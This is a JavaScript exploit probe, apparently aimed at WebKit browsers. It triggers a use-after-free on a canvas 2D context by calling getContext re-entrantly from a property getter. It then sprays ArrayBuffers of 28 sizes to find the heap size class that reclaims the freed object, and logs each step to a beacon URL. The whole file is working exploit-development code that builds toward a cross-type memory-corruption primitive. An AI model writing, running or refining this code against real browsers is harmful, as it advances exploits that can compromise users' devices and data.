// CRASH_CLASS: HIGH
// PROBE P563 v9: Size-class binary search for cross-type reclaim
//
// v8 PROVED: AB spray before Canvas2D spray = crash at lineWidth read.
// This means cross-type reclaim IS happening — an AB reclaimed the freed
// CanvasRenderingContext2D slot. But reading through stale crashes because
// AB data corrupts the C++ internal pointers.
//
// This probe identifies WHICH ArrayBuffer size matches the Canvas2D size
// class. For each size, we:
//   1. Trigger fresh UAF
//   2. Spray 30 ABs of ONE size
//   3. Spray 15 Canvas2D (safety net)
//   4. Emit "TESTING sz=X" beacon
//   5. Read lineWidth through stale
//   6. If canvas wins → safe, emit "MISS sz=X", continue
//   7. If AB wins → crash, last beacon = "TESTING sz=X" → found the size
//
// Test order: smallest to largest. The crashing size is the match.

document.write('<pre id="log" style="color:#0f0;background:#000;font:13px monospace;padding:8px;white-space:pre-wrap"></pre>');

(function () {
  var logEl = document.getElementById('log');

  function emit(tag, msg) {
    var line = tag + ' ' + msg;
    logEl.textContent += line + '\n';
    try {
      new Image().src = '/beacon/P563-' + encodeURIComponent(tag) +
        '?d=' + encodeURIComponent(String(msg).slice(0, 500));
    } catch (e) {}
  }

  emit('START', 'v9-sizescan ua=' + navigator.userAgent.slice(0, 60));

  function triggerUAF() {
    var canvas = document.createElement('canvas');
    canvas.width = 1; canvas.height = 1;
    document.body.appendChild(canvas);
    var inner = null, fired = 0;
    var opts = {};
    Object.defineProperty(opts, 'desynchronized', {
      get: function () {
        fired++;
        if (fired === 1) inner = canvas.getContext('2d');
        return false;
      },
      enumerable: true
    });
    var outer = null;
    try { outer = canvas.getContext('2d', opts); } catch (e) { return null; }
    if (outer === inner || !inner) return null;
    return { stale: inner, live: outer, canvas: canvas };
  }

  // Size classes to test (bmalloc power-of-two + intermediate)
  // Canvas2DRenderingContext is likely 512-2048 bytes based on WebKit struct size
  var SIZES = [
    128, 160, 192, 224, 256, 288, 320, 352, 384, 416, 448, 480,
    512, 576, 640, 704, 768, 896, 1024, 1152, 1280, 1536, 1792, 2048,
    2560, 3072, 3584, 4096
  ];
  var AB_PER = 30; // ABs per size test
  var CANVAS_PER = 15; // safety net canvases per test

  for (var round = 0; round < SIZES.length; round++) {
    var sz = SIZES[round];

    // Step 1: Fresh UAF
    var uaf = triggerUAF();
    if (!uaf) {
      emit('R' + round, 'NO-UAF sz=' + sz);
      continue;
    }

    // Step 2: Spray ABs of this size FIRST (before canvas)
    var fillVal = 5000.0 + round;
    var abs = [];
    for (var j = 0; j < AB_PER; j++) {
      var ab = new ArrayBuffer(sz);
      var f64 = new Float64Array(ab);
      for (var k = 0; k < f64.length; k++) f64[k] = fillVal;
      abs.push(f64);
    }

    // Step 3: Canvas2D safety net AFTER ABs
    var ctxs = [];
    for (var ci = 0; ci < CANVAS_PER; ci++) {
      var c = document.createElement('canvas');
      c.width = 1; c.height = 1;
      document.body.appendChild(c);
      var ctx = c.getContext('2d');
      if (ctx) {
        ctx.lineWidth = 800 + round;
        ctxs.push(ctx);
      }
    }

    // Step 4: Emit BEFORE read (last beacon if crash)
    emit('TEST', 'sz=' + sz + ' r=' + round + ' ab=' + abs.length + ' cv=' + ctxs.length);

    // Step 5: Read through stale — this is the dangerous line
    var lw;
    try { lw = uaf.stale.lineWidth; } catch (e) { lw = 'ERR:' + e.name; }

    // Step 6: If we're here, no crash — canvas won
    if (typeof lw === 'number') {
      var cIdx = Math.round(lw - 800);
      var abMatch = Math.abs(lw - fillVal) < 0.01;
      if (abMatch) {
        emit('HIT', 'sz=' + sz + ' lw=' + lw + ' CROSS-TYPE!');
        emit('PRIMITIVE', 'CROSS-TYPE sz=' + sz);
        // Should not reach here (AB reclaim = crash), but just in case
        break;
      } else if (cIdx >= 0 && cIdx < CANVAS_PER) {
        emit('MISS', 'sz=' + sz + ' canvas-won idx=' + cIdx);
      } else if (lw === 1) {
        emit('MISS', 'sz=' + sz + ' default-lw (unreclaimed)');
      } else {
        emit('UNK', 'sz=' + sz + ' lw=' + lw);
      }
    } else {
      emit('MISS', 'sz=' + sz + ' lw=' + lw);
    }

    // Cleanup: remove DOM nodes so GPU backing + context memory is freed
    if (uaf && uaf.canvas && uaf.canvas.parentNode)
      uaf.canvas.parentNode.removeChild(uaf.canvas);
    for (var ri = 0; ri < ctxs.length; ri++) {
      var cn = ctxs[ri].canvas;
      if (cn && cn.parentNode) cn.parentNode.removeChild(cn);
    }
    abs = null;
    ctxs = null;
    uaf = null;
  }

  emit('ALIVE', 'complete — all sizes tested without crash');
  emit('CONCLUSION', 'no AB size matched Canvas2D size class');

})();
